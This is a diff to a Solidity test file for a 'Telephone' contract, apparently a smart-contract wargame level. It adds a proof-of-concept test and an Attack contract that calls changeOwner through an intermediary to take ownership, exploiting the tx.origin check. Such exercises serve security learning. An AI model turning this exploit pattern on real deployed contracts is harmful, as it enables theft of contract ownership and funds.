@@ -29,10 +29,27 @@ contract Telephone is Test {
     }
 
     function test_changeOwner() public {
-        // assertEq(telephoneInterface.owner(), OWNER);
+        vm.startPrank(ATTACKER, ATTACKER);
 
-        // telephoneInterface.changeOwner(ATTACKER);
+        vm.expectRevert();
+        telephoneInterface.changeOwner(ATTACKER);
 
-        // assertEq(telephoneInterface.owner(), ATTACKER);
+        vm.stopPrank();
+    }
+
+    function test_PoC() public {
+        vm.startPrank(ATTACKER, ATTACKER);
+
+        new Attack(telephoneInterface);
+
+        vm.stopPrank();
+
+        assertEq(telephoneInterface.owner(), ATTACKER);
+    }
+}
+
+contract Attack {
+    constructor(ITelephone _telephoneInterface) {
+        _telephoneInterface.changeOwner(msg.sender);
     }
 }
